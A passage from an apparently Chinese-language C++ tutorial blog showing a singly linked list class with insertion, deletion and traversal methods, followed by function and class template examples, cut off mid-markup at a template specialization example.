class="class"> &#123;</span></span><br><span class="line"> public:</span><br><span class="line">     <span class="type">int</span> data;     <span class="comment">//数据域</span></span><br><span class="line">     Node * next;  <span class="comment">//指针域</span></span><br><span class="line"> &#125;;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//构建一个单链表类</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">LinkList</span>                      </span></span><br><span class="line"><span class="class"> &#123;</span></span><br><span class="line"> public:</span><br><span class="line">     LinkList();                      <span class="comment">//构建一个单链表;</span></span><br><span class="line">     ~LinkList();                  <span class="comment">//销毁一个单链表;</span></span><br><span class="line">     <span class="type">void</span> <span class="title function_">CreateLinkList</span><span class="params">(<span class="type">int</span> n)</span>;   <span class="comment">//创建一个单链表</span></span><br><span class="line">     <span class="type">void</span> <span class="title function_">TravalLinkList</span><span class="params">()</span>;        <span class="comment">//遍历线性表</span></span><br><span class="line">     <span class="type">int</span> <span class="title function_">GetLength</span><span class="params">()</span>;              <span class="comment">//获取线性表长度</span></span><br><span class="line">     <span class="type">bool</span> <span class="title function_">IsEmpty</span><span class="params">()</span>;               <span class="comment">//判断单链表是否为空</span></span><br><span class="line">     ElemType * <span class="title function_">Find</span><span class="params">(DataType data)</span>; <span class="comment">//查找节点</span></span><br><span class="line">     <span class="type">void</span> <span class="title function_">InsertElemAtEnd</span><span class="params">(DataType data)</span>;            <span class="comment">//在尾部插入指定的元素</span></span><br><span class="line">     <span class="type">void</span> <span class="title function_">InsertElemAtIndex</span><span class="params">(DataType data,<span class="type">int</span> n)</span>;    <span class="comment">//在指定位置插入指定元素</span></span><br><span class="line">     <span class="type">void</span> <span class="title function_">InsertElemAtHead</span><span class="params">(DataType data)</span>;           <span class="comment">//在头部插入指定元素</span></span><br><span class="line">     <span class="type">void</span> <span class="title function_">DeleteElemAtEnd</span><span class="params">()</span>;       <span class="comment">//在尾部删除元素</span></span><br><span class="line">     <span class="type">void</span> <span class="title function_">DeleteAll</span><span class="params">()</span>;             <span class="comment">//删除所有数据</span></span><br><span class="line">     <span class="type">void</span> <span class="title function_">DeleteElemAtPoint</span><span class="params">(DataType data)</span>;     <span class="comment">//删除指定的数据</span></span><br><span class="line">     <span class="type">void</span> <span class="title function_">DeleteElemAtHead</span><span class="params">()</span>;      <span class="comment">//在头部删除节点</span></span><br><span class="line"> private:</span><br><span class="line">     ElemType * head;              <span class="comment">//头结点</span></span><br><span class="line"> &#125;;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//初始化单链表</span></span><br><span class="line"> LinkList::LinkList()                  </span><br><span class="line"> &#123;</span><br><span class="line">     head = new ElemType;            </span><br><span class="line">     head-&gt;data = <span class="number">0</span>;               <span class="comment">//将头结点的数据域定义为0</span></span><br><span class="line">     head-&gt;next = <span class="literal">NULL</span>;            <span class="comment">//头结点的下一个定义为NULL</span></span><br><span class="line"> &#125;     </span><br><span class="line"> </span><br><span class="line"> <span class="comment">//销毁单链表</span></span><br><span class="line"> LinkList::~LinkList()</span><br><span class="line"> &#123;</span><br><span class="line">     delete head;                 <span class="comment">//删除头结点</span></span><br><span class="line"> &#125; </span><br><span class="line"> </span><br><span class="line"> <span class="comment">//创建一个单链表</span></span><br><span class="line"> <span class="type">void</span> <span class="title function_">LinkList::CreateLinkList</span><span class="params">(<span class="type">int</span> n)</span></span><br><span class="line"> &#123;</span><br><span class="line">     ElemType *pnew, *ptemp;</span><br><span class="line">     ptemp = head;</span><br><span class="line">     <span class="keyword">if</span> (n &lt; <span class="number">0</span>) &#123;       <span class="comment">//当输入的值有误时，处理异常</span></span><br><span class="line">         <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;输入的节点个数有误&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">         <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n;i++) &#123;        <span class="comment">//将值一个一个插入单链表中</span></span><br><span class="line">         pnew = new ElemType;</span><br><span class="line">         <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入第&quot;</span> &lt;&lt; i + <span class="number">1</span> &lt;&lt; <span class="string">&quot;个值: &quot;</span> ;</span><br><span class="line">         <span class="built_in">cin</span> &gt;&gt; pnew-&gt;data;</span><br><span class="line">         pnew-&gt;next = <span class="literal">NULL</span>;          <span class="comment">//新节点的下一个地址为NULL</span></span><br><span class="line">         ptemp-&gt;next = pnew;         <span class="comment">//当前结点的下一个地址设为新节点</span></span><br><span class="line">         ptemp = pnew;               <span class="comment">//将当前结点设为新节点</span></span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//遍历单链表</span></span><br><span class="line"> <span class="type">void</span> <span class="title function_">LinkList::TravalLinkList</span><span class="params">()</span></span><br><span class="line"> &#123;</span><br><span class="line">     <span class="keyword">if</span> (head == <span class="literal">NULL</span> || head-&gt;next ==<span class="literal">NULL</span>) &#123;</span><br><span class="line">         <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;链表为空表&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     ElemType *p = head;                 <span class="comment">//另指针指向头结点</span></span><br><span class="line">     <span class="keyword">while</span> (p-&gt;next != <span class="literal">NULL</span>)        <span class="comment">//当指针的下一个地址不为空时，循环输出p的数据域</span></span><br><span class="line">     &#123;</span><br><span class="line">         p = p-&gt;next;               <span class="comment">//p指向p的下一个地址</span></span><br><span class="line">         <span class="built_in">cout</span> &lt;&lt; p-&gt;data &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//获取单链表的长度</span></span><br><span class="line"> <span class="type">int</span> <span class="title function_">LinkList::GetLength</span><span class="params">()</span></span><br><span class="line"> &#123;</span><br><span class="line">     <span class="type">int</span> count = <span class="number">0</span>;                  <span class="comment">//定义count计数</span></span><br><span class="line">     ElemType *p = head-&gt;next;           <span class="comment">//定义p指向头结点</span></span><br><span class="line">     <span class="keyword">while</span> (p != <span class="literal">NULL</span>)                <span class="comment">//当指针的下一个地址不为空时，count+1</span></span><br><span class="line">     &#123;</span><br><span class="line">         count++;                  </span><br><span class="line">         p = p-&gt;next;                <span class="comment">//p指向p的下一个地址</span></span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> count;                   <span class="comment">//返回count的数据</span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//判断单链表是否为空</span></span><br><span class="line"> <span class="type">bool</span> <span class="title function_">LinkList::IsEmpty</span><span class="params">()</span></span><br><span class="line"> &#123;</span><br><span class="line">     <span class="keyword">if</span> (head-&gt;next == <span class="literal">NULL</span>) &#123;                 </span><br><span class="line">         <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//查找节点</span></span><br><span class="line"> ElemType * <span class="title function_">LinkList::Find</span><span class="params">(DataType data)</span></span><br><span class="line"> &#123;</span><br><span class="line">     ElemType * p = head;</span><br><span class="line">     <span class="keyword">if</span> (p == <span class="literal">NULL</span>) &#123;                           <span class="comment">//当为空表时，报异常</span></span><br><span class="line">         <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;此链表为空链表&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">         <span class="keyword">return</span> ERROR;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">     &#123;</span><br><span class="line">         <span class="keyword">while</span> (p-&gt;next != <span class="literal">NULL</span>)               <span class="comment">//循环每一个节点</span></span><br><span class="line">         &#123;</span><br><span class="line">             <span class="keyword">if</span> (p-&gt;data == data) &#123;</span><br><span class="line">                 <span class="keyword">return</span> p;                     <span class="comment">//返回指针域</span></span><br><span class="line">             &#125;</span><br><span class="line">             p = p-&gt;next;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">NULL</span>;                           <span class="comment">//未查询到结果</span></span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//在尾部插入指定的元素</span></span><br><span class="line"> <span class="type">void</span> <span class="title function_">LinkList::InsertElemAtEnd</span><span class="params">(DataType data)</span></span><br><span class="line"> &#123;</span><br><span class="line">     ElemType * newNode = new ElemType;    <span class="comment">//定义一个Node结点指针newNode</span></span><br><span class="line">     newNode-&gt;next = <span class="literal">NULL</span>;         <span class="comment">//定义newNode的数据域和指针域</span></span><br><span class="line">     newNode-&gt;data = data;</span><br><span class="line">     ElemType * p = head;              <span class="comment">//定义指针p指向头结点</span></span><br><span class="line">     <span class="keyword">if</span> (head == <span class="literal">NULL</span>) &#123;           <span class="comment">//当头结点为空时，设置newNode为头结点</span></span><br><span class="line">         head = newNode;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span>                          <span class="comment">//循环知道最后一个节点，将newNode放置在最后</span></span><br><span class="line">     &#123;</span><br><span class="line">         <span class="keyword">while</span> (p-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">         &#123;</span><br><span class="line">             p = p-&gt;next;</span><br><span class="line">         &#125;</span><br><span class="line">         p-&gt;next = newNode;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//在指定位置插入指定元素</span></span><br><span class="line"> <span class="type">void</span> <span class="title function_">LinkList::InsertElemAtIndex</span><span class="params">(DataType data,<span class="type">int</span> n)</span></span><br><span class="line"> &#123;</span><br><span class="line">     <span class="keyword">if</span> (n&lt;<span class="number">1</span> || n&gt;GetLength())                   <span class="comment">//输入有误报异常</span></span><br><span class="line">         <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;输入的值错误&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">     &#123;</span><br><span class="line">         ElemType * ptemp = new ElemType;        <span class="comment">//创建一个新的节点</span></span><br><span class="line">         ptemp-&gt;data = data;                     <span class="comment">//定义数据域</span></span><br><span class="line">         ElemType * p = head;                    <span class="comment">//创建一个指针指向头结点</span></span><br><span class="line">         <span class="type">int</span> i = <span class="number">1</span>;</span><br><span class="line">         <span class="keyword">while</span> (n &gt; i)                           <span class="comment">//遍历到指定的位置</span></span><br><span class="line">         &#123;</span><br><span class="line">             p = p-&gt;next;</span><br><span class="line">             i++;</span><br><span class="line">         &#125;</span><br><span class="line">         ptemp-&gt;next = p-&gt;next;                 <span class="comment">//将新节点插入到指定位置</span></span><br><span class="line">         p-&gt;next = ptemp;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//在头部插入指定元素</span></span><br><span class="line"> <span class="type">void</span> <span class="title function_">LinkList::InsertElemAtHead</span><span class="params">(DataType data)</span></span><br><span class="line"> &#123;</span><br><span class="line">     ElemType * newNode = new ElemType;    <span class="comment">//定义一个Node结点指针newNode</span></span><br><span class="line">     newNode-&gt;data = data;</span><br><span class="line">     ElemType * p = head;              <span class="comment">//定义指针p指向头结点</span></span><br><span class="line">     <span class="keyword">if</span> (head == <span class="literal">NULL</span>) &#123;           <span class="comment">//当头结点为空时，设置newNode为头结点</span></span><br><span class="line">         head = newNode;</span><br><span class="line">     &#125;</span><br><span class="line">     newNode-&gt;next = p-&gt;next;          <span class="comment">//将新节点插入到指定位置</span></span><br><span class="line">     p-&gt;next = newNode;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//在尾部删除元素</span></span><br><span class="line"> <span class="type">void</span> <span class="title function_">LinkList::DeleteElemAtEnd</span><span class="params">()</span></span><br><span class="line"> &#123;</span><br><span class="line">     ElemType * p = head;          <span class="comment">//创建一个指针指向头结点</span></span><br><span class="line">     ElemType * ptemp = <span class="literal">NULL</span>;      <span class="comment">//创建一个占位节点</span></span><br><span class="line">     <span class="keyword">if</span> (p-&gt;next == <span class="literal">NULL</span>) &#123;        <span class="comment">//判断链表是否为空</span></span><br><span class="line">         <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;单链表空&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">     &#123;</span><br><span class="line">         <span class="keyword">while</span> (p-&gt;next != <span class="literal">NULL</span>)   <span class="comment">//循环到尾部的前一个</span></span><br><span class="line">         &#123;</span><br><span class="line">             ptemp = p;            <span class="comment">//将ptemp指向尾部的前一个节点</span></span><br><span class="line">             p = p-&gt;next;          <span class="comment">//p指向最后一个节点</span></span><br><span class="line">         &#125;</span><br><span class="line">         delete p;                <span class="comment">//删除尾部节点</span></span><br><span class="line">         p = <span class="literal">NULL</span>;</span><br><span class="line">         ptemp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//删除所有数据</span></span><br><span class="line"> <span class="type">void</span> <span class="title function_">LinkList::DeleteAll</span><span class="params">()</span></span><br><span class="line"> &#123;</span><br><span class="line">     ElemType * p = head-&gt;next;</span><br><span class="line">     ElemType * ptemp = new ElemType;</span><br><span class="line">     <span class="keyword">while</span> (p != <span class="literal">NULL</span>)                    <span class="comment">//在头结点的下一个节点逐个删除节点</span></span><br><span class="line">     &#123;</span><br><span class="line">         ptemp = p;</span><br><span class="line">         p = p-&gt;next;</span><br><span class="line">         head-&gt;next = p;</span><br><span class="line">         ptemp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">         delete ptemp;</span><br><span class="line">     &#125;</span><br><span class="line">     head-&gt;next = <span class="literal">NULL</span>;                 <span class="comment">//头结点的下一个节点指向NULL</span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//删除指定的数据</span></span><br><span class="line"> <span class="type">void</span> <span class="title function_">LinkList::DeleteElemAtPoint</span><span class="params">(DataType data)</span></span><br><span class="line"> &#123;</span><br><span class="line">     ElemType * ptemp = Find(data);    <span class="comment">//查找到指定数据的节点位置</span></span><br><span class="line">     <span class="keyword">if</span> (ptemp == head-&gt;next) &#123;        <span class="comment">//判断是不是头结点的下一个节点，如果是就从头部删了它</span></span><br><span class="line">         DeleteElemAtHead();</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">     &#123;</span><br><span class="line">         ElemType * p = head;          <span class="comment">//p指向头结点</span></span><br><span class="line">         <span class="keyword">while</span> (p-&gt;next != ptemp)      <span class="comment">//p循环到指定位置的前一个节点</span></span><br><span class="line">         &#123;</span><br><span class="line">             p = p-&gt;next;</span><br><span class="line">         &#125;</span><br><span class="line">         p-&gt;next = ptemp-&gt;next;         <span class="comment">//删除指定位置的节点</span></span><br><span class="line">         delete ptemp;</span><br><span class="line">         ptemp = <span class="literal">NULL</span>;               </span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//在头部删除节点</span></span><br><span class="line"> <span class="type">void</span> <span class="title function_">LinkList::DeleteElemAtHead</span><span class="params">()</span></span><br><span class="line"> &#123;</span><br><span class="line">     ElemType * p = head;</span><br><span class="line">     <span class="keyword">if</span> (p == <span class="literal">NULL</span> || p-&gt;next == <span class="literal">NULL</span>) &#123;   <span class="comment">//判断是否为空表，报异常</span></span><br><span class="line">         <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;该链表为空表&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">     &#123;</span><br><span class="line">         ElemType * ptemp = <span class="literal">NULL</span>;      <span class="comment">//创建一个占位节点</span></span><br><span class="line">         p = p-&gt;next;</span><br><span class="line">         ptemp = p-&gt;next;              <span class="comment">//将头结点的下下个节点指向占位节点</span></span><br><span class="line">         delete p;                     <span class="comment">//删除头结点的下一个节点</span></span><br><span class="line">         p = <span class="literal">NULL</span>;</span><br><span class="line">         head-&gt;next = ptemp;           <span class="comment">//头结点的指针更换</span></span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//测试函数</span></span><br><span class="line"> <span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line"> &#123;</span><br><span class="line">     LinkList l;</span><br><span class="line">     <span class="type">int</span> i;</span><br><span class="line">     <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;1.创建单链表   2.遍历单链表   3.获取单链表的长度   4.判断单链表是否为空   5.获取节点\n&quot;</span>;</span><br><span class="line">     <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;6.在尾部插入指定元素   7.在指定位置插入指定元素   8.在头部插入指定元素\n&quot;</span>;</span><br><span class="line">     <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;9.在尾部删除元素   10.删除所有元素   11.删除指定元素   12.在头部删除元素   0.退出&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">     <span class="keyword">do</span></span><br><span class="line">     &#123;</span><br><span class="line">         <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入要执行的操作: &quot;</span>;</span><br><span class="line">         <span class="built_in">cin</span> &gt;&gt; i;</span><br><span class="line">         <span class="keyword">switch</span> (i)</span><br><span class="line">         &#123;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">             <span class="type">int</span> n;</span><br><span class="line">             <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入单链表的长度: &quot;</span>;</span><br><span class="line">             <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">             l.CreateLinkList(n);</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">             l.TravalLinkList();</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">             <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;该单链表的长度为&quot;</span> &lt;&lt; l.GetLength() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">             <span class="keyword">if</span> (l.IsEmpty() == <span class="number">1</span>)</span><br><span class="line">                 <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;该单链表是空表&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">             <span class="keyword">else</span></span><br><span class="line">             &#123;</span><br><span class="line">                 <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;该单链表不是空表&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">             DataType data;</span><br><span class="line">             <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入要获取节点的值: &quot;</span>;</span><br><span class="line">             <span class="built_in">cin</span> &gt;&gt; data;</span><br><span class="line">             <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;该节点的值为&quot;</span> &lt;&lt; l.Find(data)-&gt;data &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">             DataType endData;</span><br><span class="line">             <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入要在尾部插入的值: &quot;</span>;</span><br><span class="line">             <span class="built_in">cin</span> &gt;&gt; endData;</span><br><span class="line">             l.InsertElemAtEnd(endData);</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">             DataType pointData;</span><br><span class="line">             <span class="type">int</span> index;</span><br><span class="line">             <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入要插入的数据: &quot;</span>;</span><br><span class="line">             <span class="built_in">cin</span> &gt;&gt; pointData;</span><br><span class="line">             <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入要插入数据的位置: &quot;</span>;</span><br><span class="line">             <span class="built_in">cin</span> &gt;&gt; index;</span><br><span class="line">             l.InsertElemAtIndex(pointData, index);</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">             DataType headData;</span><br><span class="line">             <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入要在头部插入的值: &quot;</span>;</span><br><span class="line">             <span class="built_in">cin</span> &gt;&gt; headData;</span><br><span class="line">             l.InsertElemAtHead(headData);</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">             l.DeleteElemAtEnd();</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">             l.DeleteAll();</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">             DataType pointDeleteData;</span><br><span class="line">             <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入要删除的数据: &quot;</span>;</span><br><span class="line">             <span class="built_in">cin</span> &gt;&gt; pointDeleteData;</span><br><span class="line">             l.DeleteElemAtPoint(pointDeleteData);</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">             l.DeleteElemAtHead();</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">default</span>:</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;<span class="keyword">while</span> (i != <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">     system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><p>在C++中，模板是一种强大的特性，它允许你编写与类型无关的代码。模板可以用于函数（函数模板）和类（类模板）。下面是一些函数模板和类模板的示例。</p><h3 id="函数模板示例"><a href="#函数模板示例" class="headerlink" title="函数模板示例"></a>函数模板示例</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数模板，用于交换两个值</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">swapValues</span><span class="params">(T&amp; a, T&amp; b)</span> </span>&#123;</span><br><span class="line">    T temp = a;</span><br><span class="line">    a = b;</span><br><span class="line">    b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">5</span>, b = <span class="number">10</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Before swap: a = &quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot;, b = &quot;</span> &lt;&lt; b &lt;&lt; std::endl;</span><br><span class="line">    <span class="built_in">swapValues</span>(a, b);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;After swap: a = &quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot;, b = &quot;</span> &lt;&lt; b &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="type">double</span> x = <span class="number">3.14</span>, y = <span class="number">6.28</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Before swap: x = &quot;</span> &lt;&lt; x &lt;&lt; <span class="string">&quot;, y = &quot;</span> &lt;&lt; y &lt;&lt; std::endl;</span><br><span class="line">    <span class="built_in">swapValues</span>(x, y);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;After swap: x = &quot;</span> &lt;&lt; x &lt;&lt; <span class="string">&quot;, y = &quot;</span> &lt;&lt; y &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个示例中，<code>swapValues</code> 是一个函数模板，它可以用来交换任何类型的两个值。</p><h3 id="类模板示例"><a href="#类模板示例" class="headerlink" title="类模板示例"></a>类模板示例</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 类模板，用于存储和打印元素</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Printer</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    std::vector&lt;T&gt; elements;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">addElement</span><span class="params">(<span class="type">const</span> T&amp; element)</span> </span>&#123;</span><br><span class="line">        elements.<span class="built_in">push_back</span>(element);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">printElements</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; element : elements) &#123;</span><br><span class="line">            std::cout &lt;&lt; element &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        std::cout &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Printer&lt;<span class="type">int</span>&gt; intPrinter;</span><br><span class="line">    intPrinter.<span class="built_in">addElement</span>(<span class="number">1</span>);</span><br><span class="line">    intPrinter.<span class="built_in">addElement</span>(<span class="number">2</span>);</span><br><span class="line">    intPrinter.<span class="built_in">addElement</span>(<span class="number">3</span>);</span><br><span class="line">    intPrinter.<span class="built_in">printElements</span>();</span><br><span class="line"></span><br><span class="line">    Printer&lt;std::string&gt; stringPrinter;</span><br><span class="line">    stringPrinter.<span class="built_in">addElement</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">    stringPrinter.<span class="built_in">addElement</span>(<span class="string">&quot;World&quot;</span>);</span><br><span class="line">    stringPrinter.<span class="built_in">printElements</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个示例中，<code>Printer</code> 是一个类模板，它可以用来存储和打印任何类型的元素。</p><h3 id="模板特化示例"><a href="#模板特化示例" class="headerlink" title="模板特化示例"></a>模板特化示例</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td 